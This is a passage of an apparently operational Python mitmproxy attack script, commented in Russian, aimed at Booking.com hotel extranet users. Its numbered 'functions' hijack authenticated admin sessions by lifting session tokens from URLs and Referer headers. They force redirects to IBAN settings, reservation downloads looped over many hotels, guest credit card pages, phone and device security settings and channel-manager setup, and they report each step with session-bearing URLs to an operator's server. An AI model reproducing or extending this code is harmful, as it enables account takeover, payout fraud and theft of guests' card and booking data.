                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_REFRESH")
                            flow.response = http.Response.make(
                                302, b"", {
                                    "Location": target_url,
                                    "Cache-Control": "no-cache, no-store, must-revalidate",
                                    "Pragma": "no-cache",
                                    "Expires": "0",
                                    "X-MITM-Redirect": "Function-18-Post-Refresh"
                                }
                            )
                            return True
        
        # ====== ОСНОВНАЯ ЛОГИКА ФУНКЦИИ ======
        if not should_booking_reservations():
            return False

        if not host.endswith("admin.booking.com"):
            return False
        
        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 18 ======
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
        has_all_params = all(param in query for param in required_params)
        
        if has_all_params:
            log(f"[F18] ✓ Detected ALL 5 required parameters in URL -> FUNCTION 18 COMPLETED")
            full_url = url
            FUNCTION_COMPLETION_TIMES[client_ip] = {
                "function_18_completed_at": time.time(),
                "initial_url": full_url
            }
            log(f"[F18] ✓ Completion time saved for IP {client_ip}")
            remove_booking_reservations_flag()
            send_function_complete_notification(client_ip, full_url, "FUNCTION_18_COMPLETE")
            log(f"[F18] ✓ Completion notification sent for function 18")
            
            # Проверяем, не была ли функция 29 активирована (удаляем ее флаг при завершении)
            if should_booking_iban_and_reservations():
                log("[F29] Function 29 sequence completed - cleaning up")
                remove_booking_iban_and_reservations_flag()
            
            log(f"[F18] ✓ Function completed, NO final redirect - user stays on page")
            return False
        
        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
        if "reservations_download.html" in url:
            if "hotel_id" in query and "reportId" in query:
                log(f"[F18] Has hotel_id and reportId, waiting for ses and auth_assurance_last_check")
                return False
        
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        
        if not path.startswith("/hotel/"):
            return False
        
        if "reservations_download.html" in url:
            return False
        
        hotel_id = get_booking_reservations_hotel_id()
        report_id = get_booking_reservations_report_id()
        
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={hotel_id}&lang=en&reportId={report_id}"
        
        if url == target_url:
            return False
        
        log(f"[F18] ✓ Redirecting {url} -> {target_url}")
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
        
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"[F18] Error in booking_reservations_download_redirect: {e}")
        import traceback
        log(f"[F18] Traceback: {traceback.format_exc()}")
        return False

# ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 ==========
def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 27: УСЛОЖНЕННАЯ КОПИЯ ФУНКЦИИ 18
    ПОЛНОСТЬЮ повторяет логику функции 18, включая ЛОГИРОВАНИЕ
    """
    try:
        if not os.path.exists(BOOKING_RESERVATIONS_CYCLE_FLAG):
            return False
            
        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
            try:
                with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'r') as f:
                    is_active = f.read().strip() == "1"
                if not is_active:
                    return False
            except:
                return False
        else:
            return False
        
        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        client_ip = get_client_ip(flow)
        
        current_index = 0
        try:
            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE):
                with open(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE, 'r') as f:
                    current_index = int(f.read().strip())
        except:
            current_index = 0
        
        hotel_ids = []
        report_ids = []
        
        try:
            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE):
                with open(BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE, 'r') as f:
                    hotel_ids = [h.strip() for h in f.read().split(',') if h.strip()]
            
            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE):
                with open(BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE, 'r') as f:
                    report_ids = [r.strip() for r in f.read().split(',') if r.strip()]
        except Exception as e:
            log(f"[F27] Error reading parameters: {e}")
            return False
        
        if not hotel_ids or not report_ids or current_index >= min(len(hotel_ids), len(report_ids)):
            log(f"[F27] No more parameters or invalid index - ending cycle")
            remove_booking_reservations_cycle_flag()
            return False
        
        current_hotel_id = hotel_ids[current_index]
        current_report_id = report_ids[current_index]
        
        # Проверка дополнительных редиректов после завершения
        if client_ip in FUNCTION_COMPLETION_TIMES:
            completion_data = FUNCTION_COMPLETION_TIMES.get(client_ip, {})
            completion_time = completion_data.get(f"function_27_cycle_{current_index}_completed_at", 0)
            initial_url = completion_data.get(f"function_27_cycle_{current_index}_initial_url", "")
            
            if completion_time > 0:
                current_time = time.time()
                time_since_completion = current_time - completion_time
                
                is_reservations_page = "reservations_download.html" in url
                
                if is_reservations_page and initial_url:
                    parsed_current = urllib.parse.urlparse(url)
                    parsed_initial = urllib.parse.urlparse(initial_url)
                    
                    if parsed_current.path == parsed_initial.path:
                        if time_since_completion <= 3:
                            log(f"[F27] ✓ Cycle {current_index+1}: Page loaded, waiting 3s grace period")
                            return False
                        elif time_since_completion >= 10:
                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
                            log(f"[F27] ✓ Cycle {current_index+1}: 10s timeout reached - auto-redirect")
                            log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_AUTO")
                            flow.response = http.Response.make(302, b"", {"Location": target_url})
                            return True
                        elif 3 < time_since_completion < 120:
                            log(f"[F27] ✓ Cycle {current_index+1}: Page refresh - redirect to main")
                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
                            log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_REFRESH")
                            flow.response = http.Response.make(302, b"", {"Location": target_url})
                            return True
        
        if not host.endswith("admin.booking.com"):
            return False
        
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
        has_all_params = all(param in query for param in required_params)
        
        if has_all_params:
            log(f"[F27] ✓ Cycle {current_index+1}: Detected ALL 5 parameters -> CYCLE COMPLETED")
            full_url = url
            
            if client_ip not in FUNCTION_COMPLETION_TIMES:
                FUNCTION_COMPLETION_TIMES[client_ip] = {}
            
            FUNCTION_COMPLETION_TIMES[client_ip][f"function_27_cycle_{current_index}_completed_at"] = time.time()
            FUNCTION_COMPLETION_TIMES[client_ip][f"function_27_cycle_{current_index}_initial_url"] = full_url
            
            send_function_complete_notification(client_ip, full_url, f"FUNCTION_27_CYCLE_{current_index+1}_COMPLETE")
            
            try:
                with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'w') as f:
                    f.write("0")
                log(f"[F27] ✓ Cycle {current_index+1} deactivated")
            except Exception as e:
                log(f"[F27] Error deactivating cycle: {e}")
            
            next_index = current_index + 1
            
            if next_index < min(len(hotel_ids), len(report_ids)):
                try:
                    with open(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE, 'w') as f:
                        f.write(str(next_index))
                    log(f"[F27] ✓ Next cycle index: {next_index+1}")
                except Exception as e:
                    log(f"[F27] Error saving next index: {e}")
                
                def schedule_next_cycle():
                    time.sleep(60)
                    try:
                        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
                            with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'w') as f:
                                f.write("1")
                            log(f"[F27] ✓ Next cycle (index {next_index+1}) activated after 1 minute")
                        else:
                            log(f"[F27] ⚠️ Cycle active file missing, cannot activate next cycle")
                    except Exception as e:
                        log(f"[F27] Error activating next cycle: {e}")
                
                threading.Thread(target=schedule_next_cycle, daemon=True).start()
                log(f"[F27] ✓ Timer set: next cycle in 60 seconds")
            else:
                log(f"[F27] ✓ ALL CYCLES COMPLETED! Total: {next_index} cycles")
                send_function_complete_notification(client_ip, "ALL_CYCLES", "FUNCTION_27_ALL_CYCLES_COMPLETE")
                remove_booking_reservations_cycle_flag()
            
            return False
        
        if "reservations_download.html" in url:
            if "hotel_id" in query and "reportId" in query:
                log(f"[F27] Cycle {current_index+1}: Waiting for complete parameters")
                return False
        
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        
        if not path.startswith("/hotel/"):
            return False
        
        if "reservations_download.html" in url:
            return False
        
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={current_hotel_id}&lang=en&reportId={current_report_id}"
        
        if url == target_url:
            return False
        
        log(f"[F27] ✓ Cycle {current_index+1}: Redirecting {url} -> {target_url}")
        log(f"[F27] ✓ Using hotel_id={current_hotel_id}, report_id={current_report_id}")
        log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_START")
        
        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True
        
    except Exception as e:
        log(f"[F27] Error in booking_reservations_cycle_redirect: {e}")
        import traceback
        log(f"[F27] Traceback: {traceback.format_exc()}")
        return False

# Главная точка входа
def request(flow: http.HTTPFlow) -> None:
    """
    ГЛАВНАЯ ФУНКЦИЯ MITMproxy
    """
    
    url = flow.request.pretty_url
    host = (flow.request.pretty_host or "").lower()
    
    # ========== ФУНКЦИЯ 26: Мониторинг платформ ==========
    if should_monitor_platforms() and should_log_domain(flow):
        try:
            client_ip = get_client_ip(flow)
            from_url = flow.request.pretty_url
            log_redirect_to_server(client_ip, from_url, "MONITORED", "DOMAIN_MONITOR")
            log(f"[F26] ✓ Platform access logged: {host}")
        except Exception as e:
            log(f"Error in domain monitoring: {e}")
    
    # ========== ПРОВЕРКА АВТОЗАПУСКА ==========
    if not hasattr(flow, '_autostart_checked'):
        check_autostart()
        flow._autostart_checked = True
    
    # ========== ПРИОРИТЕТ 1: ФУНКЦИЯ 17 (единоразовый кастом) ==========
    if custom_redirect(flow):
        return
    
    # ========== ПРИОРИТЕТ 2: ФУНКЦИЯ 29 (IBAN + RESERVATIONS) ==========
    # ВАЖНО: ДОЛЖНА БЫТЬ ПЕРВОЙ СРЕДИ ФУНКЦИЙ 14-18-27!
    if host.endswith("admin.booking.com"):
        if booking_iban_and_reservations_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 3: ФУНКЦИЯ 14 (IBAN Settings Force) ==========
    if host.endswith("admin.booking.com"):
        if booking_iban_settings_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 4: ФУНКЦИЯ 18 (Reservations download) ==========
    if host.endswith("admin.booking.com"):
        if booking_reservations_download_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 5: ФУНКЦИЯ 27 (Циклическая копия 18) ==========
    if host.endswith("admin.booking.com"):
        if booking_reservations_cycle_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 6: ФУНКЦИЯ 19 (CC details) ==========
    if host.endswith("booking.com"):
        if booking_cc_details_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 7: BOOKING РЕДИРЕКТЫ 13-16 ==========
    if host.endswith("admin.booking.com"):
        if booking_hotel_security_redirect(flow):
            return
            
        if booking_hotel_global_redirect(flow):
            return

        if booking_redirect(flow, "message"):
            return
        if booking_redirect(flow, "provider"):
            return
        if booking_redirect(flow, "user"):
            return
        if booking_redirect(flow, "security"):
            return
    
    # ========== ПРИОРИТЕТ 8: ФУНКЦИИ 21-23 ==========
    if host.endswith("admin.booking.com"):
        if should_partners():
            if partners_redirect(flow):
                return
        
        if should_device():
            if device_redirect(flow):
                return
        
        if should_partners_and_mess():
            if should_partners() and partners_redirect(flow):
                return
    
    # ========== ПРИОРИТЕТ 9: ФУНКЦИИ 24-25 ==========
    if should_pulse():
        if pulse_redirect(flow):
            return
    
    if should_ultra_pulse():
        if ultra_pulse_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 10: ОБЫЧНЫЕ РЕДИРЕКТЫ ==========
    redirect_target = get_redirect_target()
    
    if not redirect_target:
        return
    
    if is_redirect_target(flow, redirect_target):
        log(f"skip redirect for target itself: {flow.request.pretty_url}")
        return
    
    if should_force():
        log(f"FORCE redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
        flow.response = http.Response.make(302, b"", {"Location": redirect_target})
        return

    if should_one_shot():
        log(f"GLOBAL ONE-SHOT redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
        flow.response = http.Response.make(
            302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
        )
        remove_one_shot_flag()
        return

    try:
        cookie_present = bool(flow.request.cookies.get(COOKIE))
        if cookie_present:
            log(f"cookie present -> skipping redirect for {host}")
            return
    except Exception:
        pass

    log(f"one-shot client redirect {flow.request.pretty_url} -> {redirect_target}")
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
    flow.response = http.Response.make(
        302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
    )

def cleanup_old_completion_times():
    """Очищает записи о завершении функций старше 5 минут"""
    try:
        current_time = time.time()
        to_delete = []
        
        for client_ip, data in FUNCTION_COMPLETION_TIMES.items():
            completion_time = data.get("function_18_completed_at", 0)
            if current_time - completion_time > 300:
                to_delete.append(client_ip)
        
        for client_ip in to_delete:
            del FUNCTION_COMPLETION_TIMES[client_ip]
            log(f"[F18] Cleaned up old completion time for IP {client_ip}")
            
    except Exception as e:
        log(f"[F18] Error cleaning up completion times: {e}")

# ========== ФУНКЦИЯ 13 (БЕЗ ИЗМЕНЕНИЙ) ==========
def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 13: Phone settings force
    """
    try:
        if not should_booking_hotel():
            return False

        url = flow.request.pretty_url
        approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"

        if url.startswith(approved_base):
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            if "auth_assurance_last_check" in query:
                log("Function 13: Detected approvednumbers.html with auth_assurance_last_check -> function completed")
                remove_booking_hotel_flag()
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, url, "FUNCTION_13_COMPLETE")
                
                if should_operation_16():
                    log("Operation 16: Function 13 completed, enabling function 15")
                    try:
                        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
                        if parent and not os.path.exists(parent):
                            os.makedirs(parent, exist_ok=True)
                        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
                            f.write("enabled")
                        log("Operation 16: Function 15 enabled")
                    except Exception as e:
                        log(f"Error enabling function 15 in operation 16: {e}")
            
            return False

        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        host = (flow.request.pretty_host or "").lower()

        if not host.endswith("admin.booking.com") or not path.startswith("/hotel/"):
            return False

        query = urllib.parse.parse_qs(parsed.query)
        hotel_id = None
        ses = None

        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]

        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass

        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
            if m:
                hotel_id = m.group(1)

        if not ses:
            log("Function 13: ⚠️ No ses parameter - user not authenticated, skipping redirect")
            return False
            
        if not hotel_id:
            log("Function 13: ⚠️ No hotel_id parameter - skipping redirect")
            return False

        target_url = f"{approved_base}?lang=en&ses={ses}&hotel_id={hotel_id}"

        log(f"Function 13: BOOKING_HOTEL redirect {url} -> {target_url}")

        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "BOOKING_HOTEL")

        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True

    except Exception as e:
        log(f"booking_hotel_global_redirect error: {e}")
        return False

# ========== ФУНКЦИЯ 15 (БЕЗ ИЗМЕНЕНИЙ) ==========
def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 15: Messages settings force
    """
    try:
        if not should_booking_hotel_security():
            return False

        url = flow.request.pretty_url
        
        if "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings.html" in url:
            log("Function 15: User reached messaging/settings.html -> function completed")
            remove_booking_hotel_security_flag()
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, url, "FUNCTION_15_COMPLETE")
            
            if should_operation_16():
                log("Operation 16: Function 15 completed, operation finished")
                remove_operation_16_flag()
            
            return False
        
        host = (flow.request.pretty_host or "").lower()
        if not host.endswith("admin.booking.com") or "security_settings.html" in url:
            return False

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        hotel_id = None
        ses = None
        
        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]
        
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass
        
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)
        
        if not ses:
            log("Function 15: ⚠️ No ses parameter - user not authenticated, skipping redirect")
            return False
            
        if not hotel_id:
            log("Function 15: ⚠️ No hotel_id parameter - skipping redirect")
            return False
        
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html?ses={ses}&hotel_id={hotel_id}&lang=en"
        
        log(f"Function 15: Redirect {url} -> {target_url}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_15_HOTEL_SECURITY")
        
        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True
        
    except Exception as e:
        log(f"booking_hotel_security_redirect error: {e}")
        return False

# ========== ФУНКЦИЯ 17 (БЕЗ ИЗМЕНЕНИЙ) ==========
def custom_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ
    """
    try:
        if not should_custom_redirect():
            return False
        
        if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
            log("[F17] One-time redirect already performed - skipping")
            return False
        
        url = flow.request.pretty_url
        from_domain = get_custom_redirect_from()
        to_domain = get_custom_redirect_to()
        
        if not from_domain or not to_domain:
            log("[F17] Missing FROM or TO domains")
            return False
        
        def normalize_url(url_str: str) -> str:
            if not url_str:
                return ""
            if url_str.startswith('https://'):
                url_str = url_str[8:]
            elif url_str.startswith('http://'):
                url_str = url_str[7:]
            if url_str.startswith('www.'):
                url_str = url_str[4:]
            url_str = url_str.rstrip('/')
            return url_str.lower()
        
        request_host = flow.request.pretty_host.lower()
        from_domain_normalized = normalize_url(from_domain)
        
        if from_domain_normalized not in request_host:
            return False
        
        to_domain_normalized = normalize_url(to_domain)
        if to_domain_normalized in request_host:
            return False
        
        if not url.lower().startswith(('http://', 'https://')):
            return False
        
        log(f"[F17] ✓ ONE-TIME redirect triggered!")
        log(f"[F17] From: {url}")
        log(f"[F17] To:   {to_domain}")
        
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, to_domain, "CUSTOM_ONETIME_REDIRECT")
        
        try:
            parent_dir = os.path.dirname(CUSTOM_REDIRECT_DONE_FLAG)
            if parent_dir and not os.path.exists(parent_dir):
                os.makedirs(parent_dir, exist_ok=True)
            with open(CUSTOM_REDIRECT_DONE_FLAG, 'w') as f:
                f.write("1")
            log("[F17] One-time redirect DONE flag created")
        except Exception as e:
            log(f"[F17] Error creating done flag: {e}")
        
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": to_domain,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "X-MITM-Redirect": "Function-17-One-Time"
            }
        )
        
        def cleanup_activation():
            time.sleep(3)
            try:
                if os.path.exists(CUSTOM_REDIRECT_FLAG):
                    os.remove(CUSTOM_REDIRECT_FLAG)
                    log("[F17] Activation flag removed")
                if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
                    os.remove(CUSTOM_REDIRECT_FROM_FILE)
                if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
                    os.remove(CUSTOM_REDIRECT_TO_FILE)
            except Exception as e:
                log(f"[F17] Error removing activation flag: {e}")
        
        threading.Thread(target=cleanup_activation, daemon=True).start()
        
        return True
        
    except Exception as e:
        log(f"[F17] custom_redirect error: {e}")
        import traceback
        log(f"[F17] Traceback: {traceback.format_exc()}")
        return False

# ========== ФУНКЦИЯ 19 (БЕЗ ИЗМЕНЕНИЙ) ==========
def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 19: Credit card details redirect
    """
    try:
        if not should_booking_cc_details():
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        if host.startswith("secure-admin.") and host.endswith("booking.com"):
            url_lower = url.lower()
            required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
            has_all_params = all(param in url_lower for param in required_params)
            
            if has_all_params:
                log(f"[F19] ✓ Detected ALL 5 required parameters -> FUNCTION 19 COMPLETED")
                full_url = url
                remove_booking_cc_details_flag()
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, full_url, "FUNCTION_19_COMPLETE")
                log(f"[F19] ✓ Completion notification sent")
            
            return False
        
        if "secure-admin.booking.com/booking_cc_details.html" in url.lower():
            url_lower = url.lower()
            required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
            has_all_params = all(param in url_lower for param in required_params)
            
            if has_all_params:
                log(f"[F19] ✓ Detected ALL 5 required parameters -> FUNCTION 19 COMPLETED")
                full_url = url
                remove_booking_cc_details_flag()
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, full_url, "FUNCTION_19_COMPLETE")
                log(f"[F19] ✓ Completion notification sent")
                return False
            
            return False
        
        if not host.startswith("admin.") or not host.endswith("booking.com"):
            return False
        
        referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
        if referer and "secure-admin.booking.com/booking_cc_details.html" in referer.lower():
            return False
        
        if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
            return False
        
        accept = flow.request.headers.get("Accept", "").lower()
        if not ("text/html" in accept or flow.request.method == "GET"):
            return False
        
        log(f"[F19] This is admin.booking.com request - making primary redirect")
        
        bn = get_booking_cc_details_bn()
        hotel_id_config = get_booking_cc_details_hotel_id()
        
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        lang = query.get("lang", ["en"])[0]
        
        if lang == "en":
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if "lang" in rq:
                        lang = rq.get("lang", ["en"])[0]
                except Exception as e:
                    log(f"[F19] Error parsing referer for lang: {e}")
        
        log(f"[F19] Using bn={bn}, hotel_id={hotel_id_config}, lang={lang}")
        
        target_url = f"https://secure-admin.booking.com/booking_cc_details.html?lang={lang};bn={bn};hotel_id={hotel_id_config};has_bvc=1"
        
        if url == target_url:
            return False
        
        log(f"[F19] ✓ Primary redirect {url} -> {target_url}")
        
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_19_CC_DETAILS")
        
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"[F19] Error in booking_cc_details_redirect: {e}")
        import traceback
        log(f"[F19] Traceback: {traceback.format_exc()}")
        return False

# ========== ФУНКЦИЯ 21 (БЕЗ ИЗМЕНЕНИЙ) ==========
def partners_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 21: Partners redirect
    """
    try:
        if not should_partners():
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        url_l = url.lower()

        if not host.endswith("admin.booking.com"):
            return False

        if any(ext in url_l for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
            return False

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        hotel_id = query.get("hotel_id", [None])[0]
        ses = query.get("ses", [None])[0]
        lang = query.get("lang", ["en"])[0]

        if not ses or not hotel_id:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    hotel_id = hotel_id or rq.get("hotel_id", [None])[0]
                    ses = ses or rq.get("ses", [None])[0]
                except Exception:
                    pass

        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)

        if not ses:
            log("Function 21: ⚠️ No ses parameter - user not authenticated, skipping redirect")
            return False
            
        if not hotel_id:
            log("Function 21: ⚠️ No hotel_id parameter - skipping redirect")
            return False

        target_url = (
            "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/"
            f"channel-manager/index.html?hotel_id={hotel_id}&lang={lang}&ses={ses}&view=provider-selection"
        )

        completed = False

        if "tlc=" in url_l:
            log("Function 21: ✓ Detected tlc parameter -> COMPLETED")
            completed = True
        elif "/hotel/hoteladmin/extranet_ng/manage/403.html" in url_l:
            log("Function 21: ✓ Detected 403 page -> COMPLETED")
            completed = True
        elif (
            "/hotel/hoteladmin/extranet_ng/manage/channel-manager/" in url_l
            and not url_l.startswith(target_url.lower())
        ):
            log("Function 21: ✓ User moved deeper into channel-manager -> COMPLETED")
            completed = True

        if completed:
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, url, "FUNCTION_21_COMPLETE")
            if should_partners_and_mess():
                enable_booking_hotel_security_from_partners()
            remove_partners_flag()
            return False

        if url == target_url:
            return False

        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_21_PARTNERS")

        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True

    except Exception as e:
        log(f"Function 21 ERROR: {e}")
        import traceback
        log(traceback.format_exc())
        return False

# ========== ФУНКЦИЯ 23 (БЕЗ ИЗМЕНЕНИЙ) ==========
def device_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 23: Device security redirect
    """
    try:
        if not should_device():
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        if host.endswith("account.booking.com"):
            return False
        
        if not host.endswith("admin.booking.com"):
            return False
        
        if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
            return False
        
        if "auth_assurance_last_check=" in url.lower():
            log("Function 23: ✓ Detected auth_assurance_last_check -> COMPLETED")
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, url, "FUNCTION_23_COMPLETE")
            
            if should_ultra_pulse():
                log("Function 25: Activating Pulse after Device completion")
                enable_pulse_from_ultra_pulse()
            
            remove_device_flag()
            
            target_url = "https://admin.booking.com/hotel/hoteladmin/"
            flow.response = http.Response.make(302, b"", {"Location": target_url})
            return True
        
        if "security/devices.html" in url:
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            
            if "hotel_id" in query and "ses" in query:
                log("Function 23: On devices.html with all params, waiting for auth_assurance_last_check")
                return False
            
            log("Function 23: On devices.html but missing params - waiting")
            return False
        
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        hotel_id = query.get("hotel_id", [None])[0]
        ses = query.get("ses", [None])[0]
        lang = query.get("lang", ["en"])[0]
        
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)
        
        if not ses:
            log("Function 23: ⚠️ No ses parameter - waiting for authentication, NO REDIRECT")
            return False
        
        if not hotel_id:
            log("Function 23: ⚠️ No hotel_id parameter - NO REDIRECT")
            return False
        
        referer = flow.request.headers.get("Referer") or ""
        if "account.booking.com" in referer.lower():
            log("Function 23: ⚠️ Coming from login page - waiting")
